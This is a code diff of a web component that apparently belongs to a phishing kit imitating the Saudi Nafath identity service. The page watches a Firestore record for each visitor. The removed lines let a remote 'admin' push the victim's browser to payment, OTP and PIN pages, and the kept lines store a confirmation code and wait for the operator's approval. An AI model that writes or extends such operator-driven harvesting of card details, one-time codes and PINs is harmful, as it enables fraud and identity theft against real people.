@@ -85,34 +85,6 @@ export default function Component() {
           const data = docSnap.data()
           console.log("[nafad] Firestore data received:", data)
 
-          // Admin navigation: Handle page redirects
-          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
-          const now = Date.now()
-
-          if (data.currentStep && data.currentStep !== "_t6" && data.currentStep !== "nafad") {
-            // Check if this is a NEW redirect (within 3 seconds)
-            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
-              console.log('[nafad] Stale currentStep redirect, ignoring')
-            } else {
-              if (data.currentStep === "home") {
-                console.log("[nafad] Admin redirecting to home")
-                window.location.href = "/"
-              } else if (data.currentStep === "phone") {
-                console.log("[nafad] Admin redirecting to phone-info")
-                window.location.href = "/step5"
-              } else if (data.currentStep === "_st1") {
-                console.log("[nafad] Admin redirecting to payment")
-                window.location.href = "/check"
-              } else if (data.currentStep === "_t2") {
-                console.log("[nafad] Admin redirecting to otp")
-                window.location.href = "/step2"
-              } else if (data.currentStep === "_t3") {
-                console.log("[nafad] Admin redirecting to pin")
-                window.location.href = "/step3"
-              }
-            }
-          }
-          // If currentStep === "_t6" or "nafad" or a number (from updateVisitorPage), stay on this page
           // Store received confirmation code for later use (after login)
           const confirmationCode = data.nafadConfirmationCode as string | undefined
           const codeReceivedAt = data.nafadConfirmationCodeUpdatedAt as number | undefined
@@ -125,7 +97,7 @@ export default function Component() {
           }
           
           // Listen for admin approval/rejection
-          // Listen for admin approval/rejection
+          const now = Date.now()
           const updatedAt = data.nafadConfirmationStatusUpdatedAt as number | undefined
 
           if (data.nafadConfirmationStatus === "approved") {
